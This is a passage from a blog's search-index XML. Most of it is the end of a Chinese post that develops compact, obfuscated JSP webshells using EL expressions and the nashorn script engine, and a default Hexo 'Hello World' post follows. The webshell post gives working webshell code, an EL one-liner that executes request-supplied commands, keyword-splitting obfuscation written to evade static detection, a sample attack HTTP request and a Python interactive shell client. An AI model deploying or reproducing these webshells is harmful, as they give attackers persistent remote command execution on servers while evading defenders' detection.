class="hljs-comment">//&lt;%Runtime.getRuntime().exec(&quot;calc&quot;);%&gt;</span><br>&lt;%\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%&gt;<br></code></pre></td></tr></table></figure><p>但是要完全bypass，显然两者都是不行的，那么最终的方式是采用EL表达式中的 <strong>‘.’</strong> 与 <strong>‘&#x3D;’</strong>  。</p><ul><li><strong>EL中 . 点号属性取值相当于执行对象的 getter 方法，</strong>&#x3D; <strong>赋值则等同于执行 setter 方法。</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;<br><span class="hljs-comment">//等同于</span><br>pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter(<span class="hljs-string">&quot;a&quot;</span>));<br></code></pre></td></tr></table></figure><p>通过这种方式我们可以获得ClassLoader修改一些tomcat的属性，最终达到利用session写shell的目的，当然到目前这道题目只是完成了一小部分，后面还涉及到如何使Tomcat reload 并实现持久化贮存session的问题等等，各位感兴趣的可以看一下长亭官方的wp。</p><pre><code class="hljs">**这道题目使用EL表达式进行bypass的方式引起了我的注意，通过精心构造EL表达式我们是否能实现更加精简且具有一定bypass能力的jsp webshell？**</code></pre><h2 id="0x01-简单尝试与回显问题"><a href="#0x01-简单尝试与回显问题" class="headerlink" title="0x01 简单尝试与回显问题"></a>0x01 简单尝试与回显问题</h2><p>我们使用开头提到的EL表达式来试一试：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png" alt="image-20220907140149065"></p><p>执行是没有问题的，但是我们要制作webshell，没有回显是肯定不行的，这里我联想到了前段时间学习webshell免杀的一种构造方式：<strong>调用ScriptEngine来执行js</strong>。</p><blockquote><p>我们使用ScriptEngine构造出的webshell是这样的：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br> <span class="hljs-type">String</span> s = <span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=&#x27;&quot;</span>;<br> <span class="hljs-type">String</span> cmd = request.<span class="hljs-built_in">getParameter</span>(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <span class="hljs-type">String</span> rt = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(Base64.<span class="hljs-built_in">getDecoder</span>().<span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;</span>));<br> <span class="hljs-built_in">Process</span> process = (<span class="hljs-built_in">Process</span>) <span class="hljs-keyword">new</span> <span class="hljs-built_in">ScriptEngineManager</span>().<span class="hljs-built_in">getEngineByName</span>(<span class="hljs-string">&quot;nashorn&quot;</span>).<span class="hljs-built_in">eval</span>(s + cmd + rt);<br> InputStreamReader reader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">InputStreamReader</span>(process.<span class="hljs-built_in">getInputStream</span>());<br> BufferedReader buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BufferedReader</span>(reader);<br> s = null;<br> <span class="hljs-keyword">while</span> ((s = buffer.<span class="hljs-built_in">readLine</span>()) != null) &#123;<br>     response.<span class="hljs-built_in">getWriter</span>().<span class="hljs-built_in">println</span>(s);<br> &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>很好理解，获取nashorn JavaScript引擎实现命令执行。</p></blockquote><p>想到这种方法是因为我们可以尽可能的减少webshell中的代码量，通过传递指定的js代码来执行脚本，从而更好地绕过文件内容检测。</p><h2 id="0x02-EL-ScriptEngine"><a href="#0x02-EL-ScriptEngine" class="headerlink" title="0x02 EL + ScriptEngine"></a>0x02 EL + ScriptEngine</h2><p>首先我们在webshell中通过反射配合动态传递参数的方式获取Engine并执行eval。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//test.jsp</span><br>$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>首先反射获取ScriptEngineManager对象：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">test.jsp?<span class="hljs-attribute">spr1</span>=javax.script.ScriptEngineManager<br></code></pre></td></tr></table></figure><p>然后调用js引擎执行脚本，我们将上方给出的ScriptEngine版本的webshell进行改造，将其改造成js版本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">try&#123;<br>    load(<span class="hljs-string">&quot;nashorn:mozilla_compat.js&quot;</span>);<br>&#125;<br>catch (e)&#123;<br>&#125;<br>importPackage(Packages.java.util);<br>importPackage(Packages.java.lang);<br>importPackage(Packages.java.io);<br>s=[2];<br>s[0]=<span class="hljs-string">&#x27;cmd&#x27;</span>;<br>s[1]=<span class="hljs-string">&#x27;/c whoami /all&#x27;</span>;<br><span class="hljs-attribute">a</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-attribute">b</span>=java.lang.Runtime.getRuntime().exec(s).getInputStream();<br>output+=new BufferedReader(new+InputStreamReader(b));<br><span class="hljs-keyword">while</span> ((<span class="hljs-attribute">line</span>=output.readLine()) != <span class="hljs-literal">null</span>) <br>&#123;<br>    <span class="hljs-attribute">o</span>=o+line+&quot;\n&quot;<br>&#125;;o<br></code></pre></td></tr></table></figure><p>然后我们将其传入执行js，最终的包长这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/test.jsp?spr1=javax.script.ScriptEngineManager</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.20.10.2:8080<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=4A34A77B78CD48404804BFD7420A0195<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>414<br><br><span class="language-xquery">spr2=<span class="hljs-keyword">try</span>&#123;load(<span class="hljs-string">&quot;nashorn%3amozilla_compat.js&quot;</span>)<span class="hljs-meta">%3b</span>&#125;<span class="hljs-keyword">catch</span>(e)&#123;&#125;importPackage(Packages.java.util)<span class="hljs-meta">%3bimportPackage</span>(Packages.java<span class="hljs-built_in">.lang</span>)<span class="hljs-meta">%3bimportPackage</span>(Packages.java.io)<span class="hljs-meta">%3bs</span><span class="hljs-meta">%3d</span>[<span class="hljs-number">2</span>]<span class="hljs-meta">%3bs</span>[<span class="hljs-number">0</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;cmd&#x27;</span><span class="hljs-meta">%3bs</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;/c+whoami&#x27;</span><span class="hljs-meta">%3ba</span><span class="hljs-meta">%3d</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-meta">%3bb</span><span class="hljs-meta">%3djava</span><span class="hljs-built_in">.lang</span>.Runtime.getRuntime().exec(s).getInputStream()<span class="hljs-meta">%3boutput</span>+<span class="hljs-meta">%3d</span>+new+BufferedReader(new+InputStreamReader(b))<span class="hljs-meta">%3bwhile</span>+((line<span class="hljs-meta">%3doutput</span>.readLine())+!<span class="hljs-meta">%3d</span>+null)+&#123;a<span class="hljs-meta">%3da</span><span class="hljs-meta">%2bline</span><span class="hljs-meta">%2b</span><span class="hljs-string">&quot;\n&quot;</span>&#125;<span class="hljs-meta">%3ba</span></span><br></code></pre></td></tr></table></figure><p>然后执行，没有问题。</p><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png" alt="image-20220907140219279"></p><h2 id="0x03-进一步混淆"><a href="#0x03-进一步混淆" class="headerlink" title="0x03 进一步混淆"></a>0x03 进一步混淆</h2><p>虽然已经可以通过传递指定js脚本执行命令，但仔细来看</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>这段代码还是包含了一些较为敏感的关键字，譬如forName、getEngineByName、eval等，作为一个webshell来讲，显然是不够“干净整洁”的；为进一步混淆，我们可以采用动态传递的方式来替换关键字。</p><p>在EL表达式中，我们知道获取属性可以使用a.b或者a[‘b’]，使用后者就意味着我们可以把所有属性和方法转化成字符串：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getClass&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;forName&quot;</span>]</span>(&quot;javax.script.ScriptEngineManager&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;newInstance&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getEngineByName&quot;</span>]</span>(&quot;JavaScript&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;eval&quot;</span>]</span>(&quot;...&quot;)&#125;<br></code></pre></td></tr></table></figure><p>那么这样做有什么好处呢？</p><p>首先我们可以随意拼接：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;ge&quot;</span>+<span class="hljs-string">&quot;tCl&quot;</span>+<span class="hljs-string">&quot;ass&quot;</span>]()[<span class="hljs-string">&quot;for&quot;</span>+<span class="hljs-string">&quot;Name&quot;</span>](<span class="hljs-string">&quot;javax.scr&quot;</span>+<span class="hljs-string">&quot;ipt.ScriptEng&quot;</span>+<span class="hljs-string">&quot;ineManager&quot;</span>)[<span class="hljs-string">&quot;newIn&quot;</span>+<span class="hljs-string">&quot;stance&quot;</span>]()[<span class="hljs-string">&quot;getEng&quot;</span>+<span class="hljs-string">&quot;ineByName&quot;</span>](<span class="hljs-string">&quot;java&quot;</span>+<span class="hljs-string">&quot;script&quot;</span>)[<span class="hljs-string">&quot;e&quot;</span>+<span class="hljs-string">&quot;val&quot;</span>](<span class="hljs-string">&quot;...&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>更重要的是如此我们可以将字符串通过param.xxx来传递，这样就会实现如下的改造：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure><p>测试后可以执行：</p><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220902101416244.png" alt="image-20220902101416244"></p><p>这种高度精简就实现了将绝大部分代码通过传递来执行，应当具有较好的静态免杀能力。</p><h2 id="0x04-小总结"><a href="#0x04-小总结" class="headerlink" title="0x04 小总结"></a>0x04 小总结</h2><p>这个小思路也是启发于星球里的师傅，同时也想到了之前的RWCTF中的题目，而从本质上讲也许可以把它看作是EL表达式注入的变种。</p><p>我们从最初的</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>到</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(param.spr1)<span class="hljs-selector-class">.newInstance</span>()<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&quot;javascript&quot;</span>)<span class="hljs-selector-class">.eval</span>(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>再到</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure><p>可以发现这种webshell的优势也很明显：</p><ul><li><strong>足够小，一句话就可以实现命令执行+回显的功能</strong>。</li><li><strong>避免出现&lt;%、Class、eval等敏感字符，具有bypass能力</strong>。</li></ul><p>当然这只是个demo，它还可以更美观比如将cmd通过占位符提取出来放到headers里；再比如我们的body有点臃肿，我们直接用python封装实现一个交互式shell也不错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#shell_mananger:</span><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>(<span class="hljs-params">cmd:<span class="hljs-built_in">str</span>,is_linux:<span class="hljs-built_in">bool</span></span>):<br>    PROXY=&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8081&quot;</span>&#125;<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:8080/test.jsp&quot;</span><br><br>    headers=&#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36&quot;</span>,<br><br>        &#125;<br><br>    params=&#123;<br>        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;getClass&quot;</span>,<br>        <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-string">&quot;forName&quot;</span>,<br>        <span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>,<br>        <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;newInstance&quot;</span>,<br>        <span class="hljs-string">&quot;e&quot;</span>:<span class="hljs-string">&quot;getEngineByName&quot;</span>,<br>        <span class="hljs-string">&quot;f&quot;</span>:<span class="hljs-string">&quot;javascript&quot;</span>,<br>        <span class="hljs-string">&quot;g&quot;</span>:<span class="hljs-string">&quot;eval&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> is_linux:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;/bin/bash&#x27;;s[1]=&#x27;-c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br><br>    data=&#123;<br>        <span class="hljs-string">&quot;h&quot;</span>: payload<br>        <span class="hljs-comment">#注意这里换行符要对\多转义一次防止py解析</span><br>    &#125;<br>    <span class="hljs-comment"># print(data)</span><br>    res=requests.post(url=url, headers=headers,params=urllib.parse.urlencode(params),<br>                        data=urllib.parse.urlencode(data),proxies=<span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> res.text<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    check=<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-keyword">in</span> check:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/09/12/hello-world/"/>
    <url>/2022/09/12/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem 1"></a>problem 1</h3><p>使用了图床插件，生成时会自动将图片复制到<blogname>文件夹下，但仍需要修改图片地址</p><p>将图片全部移动至_post文件夹下，注意md中图片的地址需要加上日期，如下形式：</p><p>.&#x2F;2022&#x2F;09&#x2F;12&#x2F;新型EL-webshell初探&#x2F;image-20220907140219279.png</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
